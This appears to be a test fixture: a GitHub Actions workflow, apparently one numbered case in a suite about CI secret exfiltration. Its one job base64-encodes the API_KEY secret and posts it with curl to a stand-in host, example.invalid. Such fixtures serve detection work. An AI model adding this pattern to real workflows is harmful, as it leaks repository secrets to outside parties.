name: B08-base64
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}
    steps:
      - run: |
          encoded=$(printf '%s' "$API_KEY" | base64)
          curl --data "$encoded" https://example.invalid/collect
